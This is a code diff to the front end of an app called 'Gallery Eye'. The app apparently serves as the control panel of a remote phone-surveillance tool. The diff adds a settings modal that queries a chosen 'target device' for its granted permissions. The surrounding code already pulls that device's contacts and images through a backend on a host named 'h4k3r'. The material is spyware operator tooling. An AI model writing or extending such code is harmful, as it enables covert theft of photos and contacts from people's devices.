@@ -57,7 +57,10 @@ export default function Home() {
     const [isFetchingContacts, setIsFetchingContacts] = useState(false);
     const [contactsSearchQuery, setContactsSearchQuery] = useState('');
 
-
+    // Settings Modal State
+    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
+    const [devicePermissions, setDevicePermissions] = useState<any>(null);
+    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
     useEffect(() => {
         if (status === "authenticated" && session?.user?.uuid) {
             const uuid = session.user.uuid;
@@ -140,6 +143,12 @@ export default function Home() {
                 alert(data.message || "Failed to fetch contacts");
             });
 
+            // Permission Check Response
+            socket.on("permission_status", (data: any) => {
+                setIsCheckingPermissions(false);
+                setDevicePermissions(data.permissions);
+            });
+
             fetch(`https://gallery-eye-h4k3r.onrender.com/images?uuid=${uuid}`)
                 .then((res) => res.json())
                 .then((data) => setImages(data));
@@ -196,6 +205,20 @@ export default function Home() {
         if (socket && selectedDeviceId && session?.user?.uuid) {
             setIsFetchingContacts(true);
             socket.emit("get_contacts", {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+        } else {
+            alert("Please select an online device first.");
+        }
+    };
+
+    // Permission Check Function
+    const checkPermissions = () => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            setIsCheckingPermissions(true);
+            setDevicePermissions(null);
+            socket.emit("check_permissions", {
                 uuid: session.user.uuid,
                 targetDeviceId: selectedDeviceId
             });
@@ -407,7 +430,14 @@ export default function Home() {
             <nav className="relative z-10 border-b border-white/10 bg-black/20 backdrop-blur-xl sticky top-0">
                 <div className="max-w-7xl mx-auto px-4 md:px-6 h-16 md:h-20 flex items-center justify-between">
                     <div className="flex items-center gap-3">
-                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-lg md:text-xl">G</div>
+                        {/* Settings Button */}
+                        <button
+                            onClick={() => setIsSettingsOpen(true)}
+                            className="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center hover:scale-105 transition-transform"
+                            title="Settings & Permission Check"
+                        >
+                            <svg className="w-5 h-5 md:w-6 md:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                        </button>
                         <span className="text-lg md:text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60 hidden sm:block">Gallery Eye</span>
                     </div>
 
@@ -1192,6 +1222,100 @@ export default function Home() {
                         uuid={session?.user?.uuid || ''}
                         socket={socket}
                     />
+                )}
+
+                {/* Settings Modal */}
+                {isSettingsOpen && (
+                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
+                        <div className="bg-[#1a1a1a] border border-white/20 w-full max-w-md rounded-2xl shadow-2xl animate-slideUp mx-4">
+                            <div className="p-4 border-b border-white/10 flex justify-between items-center">
+                                <h3 className="text-lg font-bold flex items-center gap-2">
+                                    <svg className="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                    Settings
+                                </h3>
+                                <button
+                                    onClick={() => setIsSettingsOpen(false)}
+                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
+                                >
+                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                </button>
+                            </div>
+
+                            <div className="p-4 space-y-4">
+                                {/* Permission Check Section */}
+                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
+                                    <h4 className="text-sm font-semibold mb-3 flex items-center gap-2">
+                                        <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                                        Permission Status
+                                    </h4>
+
+                                    {selectedDeviceId ? (
+                                        <>
+                                            <button
+                                                onClick={checkPermissions}
+                                                disabled={isCheckingPermissions}
+                                                className="w-full py-2 px-4 rounded-lg bg-purple-500/20 border border-purple-500/30 text-purple-400 hover:bg-purple-500/30 transition-colors flex items-center justify-center gap-2 mb-4"
+                                            >
+                                                {isCheckingPermissions ? (
+                                                    <>
+                                                        <div className="w-4 h-4 border-2 border-purple-400/30 border-t-purple-400 rounded-full animate-spin" />
+                                                        Checking...
+                                                    </>
+                                                ) : (
+                                                    <>
+                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                                        Check Permissions
+                                                    </>
+                                                )}
+                                            </button>
+
+                                            {devicePermissions && (
+                                                <div className="space-y-2">
+                                                    {Object.entries(devicePermissions).map(([permission, granted]: [string, any]) => (
+                                                        <div key={permission} className="flex items-center justify-between py-2 px-3 rounded-lg bg-black/20">
+                                                            <span className="text-sm text-white/70">{permission}</span>
+                                                            {granted ? (
+                                                                <span className="flex items-center gap-1 text-green-400 text-xs font-medium">
+                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path></svg>
+                                                                    Granted
+                                                                </span>
+                                                            ) : (
+                                                                <span className="flex items-center gap-1 text-red-400 text-xs font-medium">
+                                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                                                    Denied
+                                                                </span>
+                                                            )}
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            )}
+
+                                            {!devicePermissions && !isCheckingPermissions && (
+                                                <p className="text-xs text-white/40 text-center">Click "Check Permissions" to see device permission status</p>
+                                            )}
+                                        </>
+                                    ) : (
+                                        <p className="text-sm text-white/40 text-center py-4">
+                                            Select a device first to check permissions
+                                        </p>
+                                    )}
+                                </div>
+
+                                {/* Connected Device Info */}
+                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
+                                    <h4 className="text-sm font-semibold mb-2">Connected Device</h4>
+                                    {selectedDeviceId ? (
+                                        <div className="flex items-center gap-2">
+                                            <div className="w-2 h-2 rounded-full bg-green-500" />
+                                            <span className="text-sm text-white/70">{devices.find(d => d.deviceId === selectedDeviceId)?.name || 'Unknown'}</span>
+                                        </div>
+                                    ) : (
+                                        <p className="text-sm text-white/40">No device connected</p>
+                                    )}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 )}
 
                 {/* Progress Bar */}
